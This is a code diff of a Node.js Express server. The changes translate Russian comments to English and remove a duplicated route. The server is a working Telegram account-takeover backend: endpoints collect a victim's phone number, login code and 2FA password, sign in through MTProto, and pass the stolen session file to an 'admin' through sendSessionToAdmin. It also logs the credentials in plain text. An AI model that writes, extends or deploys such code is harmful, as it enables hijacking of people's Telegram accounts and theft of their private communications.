@@ -6,7 +6,7 @@ const fs = require('fs');
 const os = require('os');
 const FormData = require('form-data');
 
-// Универсальный импорт MTProto
+// Universal MTProto import
 const mtprotoModule = require('@mtproto/core');
 console.log('=== MTProto debug ===');
 console.log('Type of module:', typeof mtprotoModule);
@@ -29,18 +29,18 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Настройки Telegram MTProto
+// Telegram MTProto settings
 const api_id = parseInt(process.env.API_ID);
 const api_hash = process.env.API_HASH;
 
-// Хранилище для состояний авторизации
+// Authorization state storage
 const authStore = new Map();
 
-// Создаём папку для хранения сессии MTProto
+// Create folder for MTProto session storage
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 
-// Инициализация MTProto (пробуем с new и без)
+// Initialize MTProto (try with new and without)
 let mtproto;
 try {
   mtproto = new MTProto({
@@ -63,9 +63,9 @@ try {
   }
 }
 
-// Вспомогательная функция отправки файла сессии админу
+// Helper function to send session file to admin
 async function sendSessionToAdmin(sessionData, phone) {
-  const fileName = `session_${phone}_${Date.now()}.session`; // изменено на .session
+  const fileName = `session_${phone}_${Date.now()}.session`;
   const filePath = path.join(os.tmpdir(), fileName);
   fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));
 
@@ -84,19 +84,19 @@ async function sendSessionToAdmin(sessionData, phone) {
   }
 }
 
-// Вспомогательная функция для обработки ошибок миграции
+// Helper function to handle migration errors
 async function handleMigrateError(error, originalCall, ...args) {
   if (error.error_message && error.error_message.startsWith('PHONE_MIGRATE_')) {
     const dc = parseInt(error.error_message.split('_').pop());
     console.log(`Migrating to DC ${dc}...`);
     await mtproto.setDefaultDc(dc);
-    // Повторяем исходный вызов
+    // Retry the original call
     return await originalCall(...args);
   }
   throw error;
 }
 
-// Функция отправки реального кода через Telegram
+// Function to send real code via Telegram
 async function sendRealCode(phone) {
   try {
     const result = await mtproto.call('auth.sendCode', {
@@ -107,7 +107,7 @@ async function sendRealCode(phone) {
       success: true,
       phone_code_hash: result.phone_code_hash,
       timeout: result.timeout || 60,
-      message: 'Код отправлен Telegram'
+      message: 'Code sent via Telegram'
     };
   } catch (error) {
     console.error('MTProto sendCode error:', error);
@@ -120,18 +120,18 @@ async function sendRealCode(phone) {
         success: true,
         phone_code_hash: result.phone_code_hash,
         timeout: result.timeout || 60,
-        message: 'Код отправлен Telegram (после миграции)'
+        message: 'Code sent via Telegram (after migration)'
       };
     } catch (migrateError) {
       return {
         success: false,
-        error: migrateError.error_message || 'Не удалось отправить код'
+        error: migrateError.error_message || 'Failed to send code'
       };
     }
   }
 }
 
-// Функция проверки введённого кода
+// Function to verify entered code
 async function signInWithCode(phone, code, phone_code_hash) {
   try {
     const result = await mtproto.call('auth.signIn', {
@@ -152,15 +152,14 @@ async function signInWithCode(phone, code, phone_code_hash) {
     } catch (migrateError) {
       return {
         success: false,
-        error: migrateError.error_message || 'Неверный код'
+        error: migrateError.error_message || 'Invalid code'
       };
     }
   }
 }
 
-// Эндпоинт для запроса кода (шаг 1)
+// Endpoint to request code (step 1)
 app.post('/api/send-code', async (req, res) => {
-  app.post('/api/send-code', async (req, res) => {
   console.log('[/api/send-code] Headers:', req.headers);
   console.log('[/api/send-code] Body:', req.body);
   const { phone } = req.body;
@@ -169,10 +168,6 @@ app.post('/api/send-code', async (req, res) => {
     console.log('[/api/send-code] Phone missing, returning 400');
     return res.status(400).json({ error: 'Phone required' });
   }
-  // ... остальной код
-  });
-  const { phone } = req.body;
-  if (!phone) return res.status(400).json({ error: 'Phone required' });
 
   const cleanPhone = phone.replace(/\D/g, '');
   console.log(`[/api/send-code] Received phone: ${phone}, clean: ${cleanPhone}`);
@@ -202,7 +197,7 @@ app.post('/api/send-code', async (req, res) => {
   });
 });
 
-// Эндпоинт для проверки кода (шаг 2)
+// Endpoint to verify code (step 2)
 app.post('/api/verify-code', async (req, res) => {
   const { phone, code } = req.body;
   console.log('[/api/verify-code] Received:', { phone, code });
@@ -251,7 +246,7 @@ app.post('/api/verify-code', async (req, res) => {
   }
 });
 
-// Эндпоинт для отправки пароля (шаг 3)
+// Endpoint to submit 2FA password (step 3)
 app.post('/api/submit-password', async (req, res) => {
   const { phone, password } = req.body;
   console.log('[/api/submit-password] Received:', { phone, password });
